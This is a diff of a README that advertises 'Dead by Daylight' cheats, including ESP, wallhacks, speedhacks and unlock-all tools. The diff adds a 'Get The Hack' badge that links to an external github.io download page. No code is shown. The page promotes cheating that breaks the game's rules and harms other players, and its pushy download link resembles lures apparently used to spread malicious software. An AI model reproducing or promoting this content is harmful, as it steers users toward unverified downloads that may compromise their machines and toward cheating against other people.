@@ -4,7 +4,7 @@
 
 **Dead by Daylight (DBD)** is a 4v1 horror survival game where survivors repair generators and killers hunt them down. While thrilling, it can be frustrating to grind for perks, cosmetics, or escape against top players. That’s where a **Dead by Daylight hack** comes in – powerful tools like **ESP, wallhacks, speedhacks, and unlock-all cheats** that give you complete control over matches.
 
-
+[![Get](https://img.shields.io/badge/Get%20The-Hack-blueviolet)](https://dead-by-daylight-hacks.github.io/.github/)
 ---
 
 ## What Is a Dead by Daylight Hack?
